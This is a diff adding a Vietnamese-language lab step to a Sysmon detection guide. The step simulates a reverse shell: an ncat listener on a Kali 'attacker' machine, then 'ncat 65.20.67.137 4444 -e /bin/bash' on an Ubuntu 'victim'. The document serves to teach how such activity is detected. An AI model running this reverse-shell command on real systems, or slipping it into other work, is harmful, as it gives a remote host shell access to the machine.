@@ -249,3 +249,20 @@ sudo sysmon -i sysmon.conf
 sudo systemctl restart sysmon
 ```
 
+### Bước 3: Mô phỏng tiến trình đáng ngờ (Reverse Shell)
+
+1. **Mô phỏng Reverse Shell**
+- Trên máy Kali (kẻ tấn công), tạo 1 netcat listener
+
+```
+ncat -lvnp 4444
+```
+
+<img width="463" height="132" alt="image" src="https://github.com/user-attachments/assets/109a960b-9466-4224-b60c-4a0375e479b7" />
+
+- Trên máy Ubuntu (nạn nhân), dùng netcat kết nối với máy Kali, tạo reverse shell
+
+```
+ncat 65.20.67.137 4444 -e /bin/bash
+```
+
